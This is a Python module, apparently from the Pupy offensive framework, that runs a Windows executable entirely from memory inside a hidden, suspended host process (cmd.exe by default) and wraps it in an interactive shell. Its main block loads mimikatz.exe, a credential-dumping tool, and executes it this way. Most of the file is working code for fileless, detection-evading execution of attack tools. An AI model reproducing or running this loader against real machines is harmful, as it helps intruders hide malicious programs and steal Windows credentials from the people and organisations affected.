# -*- coding: UTF8 -*-
# --------------------------------------------------------------
# Copyright (c) 2015, Nicolas VERDIER (contact@n1nj4.eu)
# All rights reserved.
# 
# Redistribution and use in source and binary forms, with or without modification, are permitted provided that the following conditions are met:
# 
# 1. Redistributions of source code must retain the above copyright notice, this list of conditions and the following disclaimer.
# 
# 2. Redistributions in binary form must reproduce the above copyright notice, this list of conditions and the following disclaimer in the documentation and/or other materials provided with the distribution.
# 
# 3. Neither the name of the copyright holder nor the names of its contributors may be used to endorse or promote products derived from this software without specific prior written permission.
# 
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE
# --------------------------------------------------------------
import sys
import pupymemexec
import time
import os
import ctypes
from ctypes.wintypes import DWORD
import traceback
import time
import threading

WAIT_TIMEOUT=0x00000102

def WriteFile(handle, data):
    c_writen = DWORD()
    buffer = ctypes.create_string_buffer(data)
    if not ctypes.windll.kernel32.WriteFile(handle, buffer, len(data), ctypes.byref(c_writen), None):
        raise ctypes.WinError()

def ReadFile(handle, max_bytes):
    c_read = DWORD()
    buffer = ctypes.create_string_buffer(max_bytes+1)
    success = ctypes.windll.kernel32.ReadFile(handle, buffer, max_bytes, ctypes.byref(c_read), None)
    if not success:
        last_error=ctypes.windll.kernel32.GetLastError()
        if last_error==0x6D:#ERROR_BROKEN_PIPE
            return ""
        raise WindowsError("ReadFile failed Errno: 0x%x"%last_error)
    buffer[c_read.value] = '\x00'
    return buffer.value

class MemoryPE(object):
    """ run a pe from memory. The program output is displayed on program exit. You can set a timeout or raise KeyboardInterrupt to kill the program. If a timeout is set it will kill the program when it reaches the delay """
    def __init__(self, raw_pe, args=[], suspended_process="cmd.exe", redirect_stdio=True, hidden=True, dupHandle=None):
        self.cmdline=suspended_process
        if args:
            self.cmdline+=" "+" ".join(args)
        self.raw_pe=raw_pe
        self.suspended_process=suspended_process
        self.redirect_stdio=redirect_stdio
        self.hidden=hidden
        self.hProcess=None
        self.rpStdout=None
        self.dupHandle=dupHandle
        if self.dupHandle is None:
            self.dupHandle=0
        self.EOF=threading.Event()

    def close(self):
        #Killing the program if he is still alive
        ctypes.windll.kernel32.CloseHandle(self.rpStdout)
        ctypes.windll.kernel32.TerminateProcess(self.hProcess, 1);
        ctypes.windll.kernel32.CloseHandle(self.hProcess)

    def wait(self, timeout=None):
        """ return False if the timeout occured"""
        if self.hProcess is None:
            return True
        starttime=time.time()
        while True:
            try:
                res=ctypes.windll.kernel32.WaitForSingleObject(self.hProcess, DWORD(1))# not INFINITE to be able to interrupt it !
                if res!=WAIT_TIMEOUT:
                    break
                if timeout is not None and time.time()-starttime>timeout:
                    return False
            except KeyboardInterrupt:
                break
        return True

    def get_stdout(self):
        if not self.hProcess:
            return ""
        #Closing the write handle to avoid lock:
        #ctypes.windll.kernel32.CloseHandle(self.rpStdout)

        fulldata=b""
        while True:
            data=ReadFile(self.pStdout, 2048)
            if not data:
                self.EOF.set()
                break
            fulldata+=data
        return fulldata

    def write_stdin(self, data):
        WriteFile(self.pStdin, data)

    def get_shell(self):
        t=threading.Thread(target=self.loop_read)
        t.daemon=True
        t.start()
        try:
            while True:
                data=raw_input()
                self.write_stdin(data+"\n")
                if data=="exit":
                    break
                if self.EOF.is_set():
                    break
        finally:
            self.close()

    def loop_read(self):
        while True:
            data=ReadFile(self.pStdout, 2048)
            sys.stdout.write(data)
            sys.stdout.flush()
            if not data:
                break

    def run(self):
        hProcess, pStdin, pStdout, rpStdin, rpStdout =  pupymemexec.run_pe_from_memory(self.cmdline, self.raw_pe, self.redirect_stdio, self.hidden, self.dupHandle)
        self.pStdout=pStdout
        self.pStdin=pStdin
        self.rpStdout=rpStdout
        self.rpStdin=rpStdin
        self.hProcess=hProcess



if __name__=="__main__":
    with open("mimikatz.exe",'rb') as f:
        mpe=MemoryPE(f.read())
        mpe.run()
        mpe.get_shell()
        #mpe.wait(5)
        #mpe.close()
        #print mpe.get_stdout()
